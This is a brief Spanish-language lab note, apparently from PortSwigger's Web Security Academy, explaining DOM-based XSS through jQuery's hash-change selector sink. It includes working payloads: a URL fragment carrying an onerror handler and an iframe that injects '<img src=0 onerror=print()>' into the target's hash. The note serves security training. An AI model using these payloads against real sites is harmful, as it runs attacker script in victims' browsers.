Una característica que tienen los selectores de jquery es que al insertar una instrucción o contenido html el te crea el contenido temporalmente y esto puede ser una via de explotación
Ej imagina una función de jquery que tome por parámetro algo como
```
https://0a9600e504ad5b4a80c417ef00e200a4.web-security-academy.net/#%3Cimage%20src=0%20onerror=alert(0)%3E

#%3Cimage%20src=0%20onerror=alert(0)%3E 

#Es lo que toma el meodo de jquery al momento de buscar el hastag del blog por lo que crea el elemento
```
pues ejecutaría el código al crear temporalmente el elemento

En este ejercicio particular nos dan un servidor atacante ya que la función de jquery se ejecuta al haber un cambio en el hashtag de la url , por lo que mediante iframe intentaremos forzar ese cambio en el hastag para que se ejecute nuestro código 

```
<iframe src="https://0a9600e504ad5b4a80c417ef00e200a4.web-security-academy.net/#" onload="this.src+='<img src=0 onerror=print()>'"></iframe>
```


